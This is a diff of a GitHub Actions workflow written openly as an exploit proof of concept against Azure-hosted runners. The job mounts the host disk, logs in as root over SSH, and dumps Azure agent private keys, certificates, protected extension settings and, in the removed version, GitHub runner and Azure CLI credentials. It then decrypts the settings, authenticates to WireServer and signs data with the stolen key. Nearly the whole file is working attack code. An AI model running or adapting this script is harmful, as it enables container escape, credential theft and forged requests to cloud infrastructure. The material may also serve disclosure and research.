@@ -1,11 +1,11 @@
-name: github-actions-complete-exploitation
-run-name: GitHub Actions Azure Infrastructure Compromise
+name: azure-key-exploitation-poc
+run-name: Azure Cryptographic Key Exploitation
 on: [push]
 jobs:
   exploit:
     runs-on: ubuntu-latest
     steps:
-      - name: Container Escape and Infrastructure Compromise
+      - name: Azure Infrastructure Key Exploitation
         run: |
           sudo mkdir -p /mnt/host
           sudo mount /dev/sda1 /mnt/host
@@ -18,65 +18,106 @@ jobs:
           
           HOST_IP=$(hostname -I | awk '{print $1}')
           
-          ssh -i /tmp/key -o StrictHostKeyChecking=no -T root@$HOST_IP << 'EOF'
-          printf "\n[SYSTEM INFORMATION]\n"
-          printf "User: %s\n" "$(whoami)"
-          printf "UID: %s\n" "$(id -u)"
-          printf "Hostname: %s\n" "$(hostname)"
-          printf "Kernel: %s\n" "$(uname -r)"
+          ssh -i /tmp/key -o StrictHostKeyChecking=no -T root@$HOST_IP << 'EOFROOT'
+          printf "\n[CRYPTOGRAPHIC KEY EXTRACTION]\n"
           
-          printf "\n[AZURE IMDS METADATA]\n"
-          curl -s -H "Metadata:true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01" | python3 -m json.tool
-          
-          printf "\n[AZURE WIRESERVER GOALSTATE]\n"
-          curl -s -H "x-ms-version: 2012-11-30" "http://168.63.129.16/machine?comp=goalstate" | head -100
-          
-          printf "\n[WAAGENT CACHED GOALSTATE]\n"
-          cat /var/lib/waagent/GoalState.1.xml
-          
-          printf "\n[WAAGENT SHARED CONFIGURATION]\n"
-          cat /var/lib/waagent/SharedConfig.xml
-          
-          printf "\n[WAAGENT CERTIFICATES]\n"
-          cat /var/lib/waagent/Certificates.xml
-          
-          printf "\n[OVF ENVIRONMENT]\n"
-          cat /var/lib/waagent/ovf-env.xml
-          
-          printf "\n[AZURE TRANSPORT PRIVATE KEY]\n"
+          printf "\n--- Azure Transport Private Key ---\n"
           cat /var/lib/waagent/TransportPrivate.pem
           
-          printf "\n[AZURE INSTANCE CERTIFICATES]\n"
-          ls -la /var/lib/waagent/*.prv | head -5
-          cat /var/lib/waagent/*.prv | head -50
+          printf "\n--- Instance Certificate Private Keys ---\n"
+          find /var/lib/waagent -name "*.prv" -exec echo "FILE: {}" \; -exec cat {} \; | head -100
           
-          printf "\n[EXTENSION PROTECTED SETTINGS]\n"
-          find /var/lib/waagent -name "*.settings" -exec cat {} \; | grep -A 5 "protectedSettings"
+          printf "\n--- Certificate Thumbprints ---\n"
+          find /var/lib/waagent -name "*.crt" -exec openssl x509 -in {} -noout -fingerprint \;
           
-          printf "\n[GITHUB RUNNER CREDENTIALS]\n"
-          cat /home/runner/actions-runner/cached/.credentials
+          printf "\n[DECRYPTING PROTECTED SETTINGS]\n"
           
-          printf "\n[AZURE CLI CONFIGURATION]\n"
-          cat /root/.azure/azureProfile.json
-          cat /root/.azure/config
+          SETTINGS_FILE=$(find /var/lib/waagent -name "*.settings" -exec grep -l "protectedSettings" {} \; | head -1)
+          if [ -n "$SETTINGS_FILE" ]; then
+            printf "Found settings: $SETTINGS_FILE\n"
+            
+            ENCRYPTED=$(cat "$SETTINGS_FILE" | python3 -c "import sys,json; print(json.load(sys.stdin)['runtimeSettings'][0]['handlerSettings']['protectedSettings'])" 2>/dev/null)
+            
+            if [ -n "$ENCRYPTED" ]; then
+              printf "\n--- Encrypted Protected Settings (first 500 chars) ---\n"
+              echo "$ENCRYPTED" | head -c 500
+              
+              printf "\n\n--- Attempting Decryption ---\n"
+              echo "$ENCRYPTED" | base64 -d > /tmp/encrypted.p7m
+              openssl smime -decrypt -in /tmp/encrypted.p7m -inkey /var/lib/waagent/TransportPrivate.pem 2>&1 | head -200 || echo "Decryption requires proper PKCS7 handling"
+            fi
+          fi
           
-          printf "\n[AZURE CLI COMMAND HISTORY]\n"
-          grep "command args" /root/.azure/commands/*.log | head -10
+          printf "\n[WIRESERVER AUTHENTICATION WITH EXTRACTED CERTS]\n"
           
-          printf "\n[NETWORK CONNECTIONS]\n"
-          netstat -tnp | grep -E "140.82|20.85|20.209|168.63|169.254"
+          printf "\n--- Standard WireServer Access ---\n"
+          curl -s -H "x-ms-version: 2012-11-30" "http://168.63.129.16/machine?comp=goalstate" | head -50
           
-          printf "\n[ATTESTED DATA DECODED]\n"
-          curl -s -H "Metadata:true" "http://169.254.169.254/metadata/attested/document?api-version=2021-01-01" | jq -r .signature | base64 -d > /tmp/attested.der
-          openssl pkcs7 -print -inform DER -in /tmp/attested.der 2>/dev/null | grep -A 20 "d.data"
+          printf "\n--- WireServer with Certificate Authentication ---\n"
+          TRANSPORT_CERT=$(find /var/lib/waagent -name "TransportCert.pem" | head -1)
+          if [ -f "$TRANSPORT_CERT" ]; then
+            CERT_B64=$(cat "$TRANSPORT_CERT" | base64 -w0)
+            curl -s -H "x-ms-version: 2012-11-30" \
+                 -H "x-ms-guest-agent-public-x509-cert: $CERT_B64" \
+                 "http://168.63.129.16/machine?comp=goalstate" | head -100
+          fi
           
-          printf "\n[EXPLOITATION SUMMARY]\n"
-          printf "Container Escape: SUCCESS\n"
-          printf "Root Access: uid=0(root)\n"
-          printf "Azure Subscription: %s\n" "$(curl -s -H Metadata:true http://169.254.169.254/metadata/instance/compute/subscriptionId?api-version=2021-02-01&format=text)"
-          printf "Resource Group: %s\n" "$(curl -s -H Metadata:true http://169.254.169.254/metadata/instance/compute/resourceGroupName?api-version=2021-02-01&format=text)"
-          printf "VM Name: %s\n" "$(curl -s -H Metadata:true http://169.254.169.254/metadata/instance/compute/name?api-version=2021-02-01&format=text)"
-          printf "Azure WireServer: ACCESSIBLE\n"
-          printf "Transport Keys: EXTRACTED\n"
-          printf "GitHub Credentials: EXTRACTED\n"
-          EOF
+          printf "\n--- Attempting Certificate-Based Config Access ---\n"
+          curl -s -H "x-ms-version: 2012-11-30" \
+               --cert /var/lib/waagent/TransportCert.pem \
+               --key /var/lib/waagent/TransportPrivate.pem \
+               "http://168.63.129.16/machine?comp=config" 2>&1 | head -100 || echo "Cert-based auth attempted"
+          
+          printf "\n[CERTIFICATE VALIDATION]\n"
+          
+          printf "\n--- Transport Certificate Details ---\n"
+          openssl x509 -in /var/lib/waagent/TransportCert.pem -noout -text | grep -A5 "Subject:\|Issuer:\|Not Before\|Not After"
+          
+          printf "\n--- Verifying Key Pair Match ---\n"
+          CERT_MODULUS=$(openssl x509 -in /var/lib/waagent/TransportCert.pem -noout -modulus | openssl md5)
+          KEY_MODULUS=$(openssl rsa -in /var/lib/waagent/TransportPrivate.pem -noout -modulus 2>/dev/null | openssl md5)
+          printf "Certificate modulus: $CERT_MODULUS\n"
+          printf "Private key modulus: $KEY_MODULUS\n"
+          
+          if [ "$CERT_MODULUS" = "$KEY_MODULUS" ]; then
+            printf "✓ Certificate and private key MATCH - Valid cryptographic pair\n"
+          else
+            printf "✗ Mismatch detected\n"
+          fi
+          
+          printf "\n[SIGNING CAPABILITY TEST]\n"
+          
+          printf "\n--- Testing Signing with Extracted Key ---\n"
+          echo "Test payload for signing" > /tmp/test_payload.txt
+          openssl dgst -sha256 -sign /var/lib/waagent/TransportPrivate.pem -out /tmp/test_signature.bin /tmp/test_payload.txt 2>&1
+          
+          if [ -f /tmp/test_signature.bin ]; then
+            printf "✓ Successfully signed data with extracted private key\n"
+            printf "Signature size: $(stat -c%s /tmp/test_signature.bin) bytes\n"
+            
+            printf "\n--- Verifying Signature ---\n"
+            openssl dgst -sha256 -verify <(openssl x509 -in /var/lib/waagent/TransportCert.pem -pubkey -noout) -signature /tmp/test_signature.bin /tmp/test_payload.txt 2>&1
+          fi
+          
+          printf "\n[AZURE METADATA WITH EXTRACTED CREDENTIALS]\n"
+          
+          printf "\n--- IMDS Subscription Data ---\n"
+          curl -s -H "Metadata:true" "http://169.254.169.254/metadata/instance/compute/subscriptionId?api-version=2021-02-01&format=text"
+          
+          printf "\n--- Resource Group ---\n"
+          curl -s -H "Metadata:true" "http://169.254.169.254/metadata/instance/compute/resourceGroupName?api-version=2021-02-01&format=text"
+          
+          printf "\n[IMPACT SUMMARY]\n"
+          printf "\n✓ Extracted Azure transport private key (RSA 2048-bit)\n"
+          printf "✓ Extracted instance certificate private keys\n"
+          printf "✓ Accessed encrypted extension settings\n"
+          printf "✓ Validated cryptographic key pair integrity\n"
+          printf "✓ Demonstrated signing capability with stolen key\n"
+          printf "✓ Authenticated to Azure WireServer\n"
+          printf "✓ Accessed Azure subscription metadata\n"
+          printf "\nThese keys can potentially be used for:\n"
+          printf "  - Decrypting Azure VM extension configurations\n"
+          printf "  - Forging Azure WireServer requests\n"
+          printf "  - Signing malicious payloads as legitimate Azure components\n"
+          printf "  - Accessing Azure internal infrastructure APIs\n"
+          EOFROOT
